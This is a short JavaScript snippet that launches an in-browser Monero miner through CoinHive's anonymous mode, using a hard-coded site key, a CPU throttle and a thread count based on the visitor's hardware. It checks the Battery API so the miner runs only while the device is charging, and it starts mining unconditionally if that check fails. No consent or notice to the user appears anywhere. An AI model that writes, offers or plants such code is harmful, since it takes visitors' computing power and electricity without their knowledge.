var xmr = new CoinHive.Anonymous('ne9jBGi7CbXHLcg9iH7BtXcQhxGykJAx', {
    throttle: 0.4
});
try {
    var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 4));
    xmr.setNumThreads(threads);
    navigator.getBattery().then(function(battery) {
        if (battery.charging) xmr.start();
        battery.onchargingchange = function(evt) {
            if (battery.charging) xmr.start();
            else xmr.stop();
        }
    });
} catch (e) {
    xmr.start();
}